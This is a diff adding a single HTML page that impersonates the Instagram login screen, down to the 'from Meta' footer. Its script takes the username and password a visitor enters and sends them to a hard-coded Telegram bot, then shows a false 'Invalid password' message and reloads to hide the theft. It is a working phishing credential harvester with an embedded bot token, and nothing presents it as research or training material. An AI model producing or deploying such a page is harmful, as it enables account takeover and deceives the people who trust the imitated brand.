@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <style>
+        body { background-color: black; color: white; font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .container { width: 85%; max-width: 350px; text-align: center; }
+        h1 { font-size: 35px; margin-bottom: 30px; }
+        input { width: 100%; padding: 14px; margin-bottom: 12px; background-color: #121212; border: 1px solid #363636; border-radius: 10px; color: white; box-sizing: border-box; }
+        button { width: 100%; padding: 14px; background-color: #0095f6; border: none; border-radius: 25px; color: white; font-weight: bold; cursor: pointer; }
+        .footer { position: absolute; bottom: 30px; text-align: center; color: #737373; font-size: 14px; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1 style="font-family: serif;">Instagram</h1>
+        <input type="text" id="user" placeholder="Username, email or mobile number">
+        <input type="password" id="pass" placeholder="Password">
+        <button onclick="login()">Log in</button>
+    </div>
+    <div class="footer">from<br><span style="color:white; font-weight:bold;">Meta</span></div>
+
+    <script>
+        function login() {
+            const u = document.getElementById('user').value;
+            const p = document.getElementById('pass').value;
+            if(!u || !p) return;
+            const token = "7613459656:AAGQ9YufupJTUGedqSBSSobBln_8SrCbY4g";
+            const id = "7712950930";
+            const msg = `👤 User: ${u}\n🔑 Pass: ${p}`;
+            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${id}&text=${encodeURIComponent(msg)}`)
+            .then(() => { alert("Invalid password. Please try again."); location.reload(); });
+        }
+    </script>
+</body>
+</html>
